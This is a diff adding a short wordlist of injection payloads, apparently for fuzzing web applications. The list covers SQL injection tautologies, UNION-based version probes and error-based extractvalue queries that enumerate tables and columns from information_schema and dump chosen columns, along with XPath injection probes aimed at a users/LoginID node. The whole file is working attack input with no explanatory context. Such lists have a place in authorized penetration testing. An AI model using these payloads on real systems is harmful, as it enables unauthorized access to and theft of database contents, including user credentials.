@@ -1,0 +1,29 @@
+1/0
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+lol' or 1=1 or 'a'='a
+'%20o/**/r%201/0%20--
+' o/**/r 1/0 --
+;
+'%20and%201=2%20--
+' and 1=2 --
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+ or name(//users/LoginID[1]) = 'LoginID' or 'a'='b
+test?%20UNION%20select%201,%20@@version,%201,%201;?
+test? UNION select 1, @@version, 1, 1;?
+  and extractvalue(rand(),concat(version()))--
+  and extractvalue(rand(),concat(user()))--
+  and extractvalue(rand(),concat(database()))--
+  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,table_name) from information_schema.tables limit N,1)))--
+  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,column_name) from information_schema.columns limit N,1)))--
+  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,ColumnName1,0x3a,ColumnName2,0x3a,ColumnName3) from TableName)))--
